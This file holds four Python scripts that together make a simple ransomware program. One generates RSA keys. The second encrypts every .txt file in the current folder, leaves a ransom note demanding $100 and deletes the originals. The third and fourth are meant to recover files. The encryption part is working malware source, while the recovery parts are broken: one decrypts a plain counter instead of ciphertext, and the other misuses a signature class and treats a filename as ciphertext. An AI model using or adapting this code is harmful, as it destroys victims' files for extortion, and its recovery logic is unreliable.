#Pt 1
import os
import sys
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP


if __name__ == "__main__":
    key = RSA.generate(2048)
    private_key = key.export_key()
    file_out = open("d.key", "wb")
    file_out.write(private_key)
    file_out.close()
    public_key = key.publickey().export_key()
    file_out = open("e.key", "wb")
    file_out.write(public_key)
    file_out.close()


#Pt 2
import os
import sys
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP

if __name__ == "__main__":
    public_key = RSA.import_key(open("e.key").read())
    # Read each file in the current directory that ends with .txt and encrypt it
    count = 0
    for file in os.listdir():
        if file.endswith(".txt"):
            # Read the file
            file_in = open(file, "rb")
            message = file_in.read()
            file_in.close()
            # Encrypt the file
            encryptor = PKCS1_OAEP.new(public_key)
            encrypted = encryptor.encrypt(message)
            # Write the encrypted file
            file_out = open(file + ".encrypted", "wb")
            file_out.write(encrypted)
            file_out.close()
            # Write the note
            file_out = open(file + ".note", "w")
            file_out.write("This is a ransom note. Pay $100 to get your file back.")
            file_out.close()
            # Write a unique identifier number to the file
            file_out = open(file + ".ID", "w")
            file_out.write(str(count))
            file_out.close()
            # Delete the original file
            os.remove(file)
            count += 1


#Pt 3
import os
import sys
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP

if __name__ == "__main__":
    file_in = open("d.key", "rb")
    private_key = RSA.import_key(file_in.read())
    file_in.close()
    # Read the identifier input
    identifier = sys.argv[1]
    # Decrypt the identifier
    decryptor = PKCS1_OAEP.new(private_key)
    # Find the file with the identifier
    for file in os.listdir():
        if file.endswith(".ID"):
            file_in = open(file, "r")
            message = file_in.read()
            file_in.close()
            if message == identifier:
                # Decrypt the identifier
                decrypted = decryptor.decrypt(message)
                print(decrypted)
                break


#Pt 4
import os
import sys
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP

if __name__ == "__main__":
    encrypted = sys.argv[1]

    decryption_key = sys.stdin.read()

    decryptor = PKCS1_v1_5.new(decryption_key)
    decrypted = decryptor.decrypt(encrypted, None)

    file_out = open(sys.argv[1].replace(".encrypted", ""), "wb")
    file_out.write(decrypted)
    file_out.close()





